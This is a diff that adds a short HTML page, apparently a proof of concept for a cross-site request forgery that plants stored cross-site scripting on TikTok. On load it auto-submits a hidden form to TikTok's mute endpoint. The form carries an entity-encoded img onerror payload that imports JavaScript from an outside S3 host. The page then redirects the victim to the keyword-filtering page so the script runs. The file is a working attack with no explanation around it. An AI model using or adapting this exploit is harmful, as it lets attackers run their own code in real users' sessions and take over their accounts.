@@ -1,0 +1,17 @@
+<html>
+  <body>
+    <form id="muteForm" action="https://www.tiktok.com/tiktok/v1/mute/create/" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="texts" value="&#91;&quot;&lt;img&#47;src&#61;x&#32;onerror&#61;import&#40;&#39;https&#58;&#47;&#47;imrannissar.s3.eu-north-1.amazonaws.com&#47;test8.js&#39;&#41;&gt;&quot;&#93;" />
+      <input type="hidden" name="scenes" value="&#91;0&#93;" />
+      <input type="submit" value="Submit request" />
+    </form>
+
+    <script>
+      document.getElementById('muteForm').submit();
+
+      setTimeout(function() {
+        window.location.replace('https://www.tiktok.com/setting/keyword-filtering');
+      }, 100); // Adjust delay as needed
+    </script>
+  </body>
+</html>
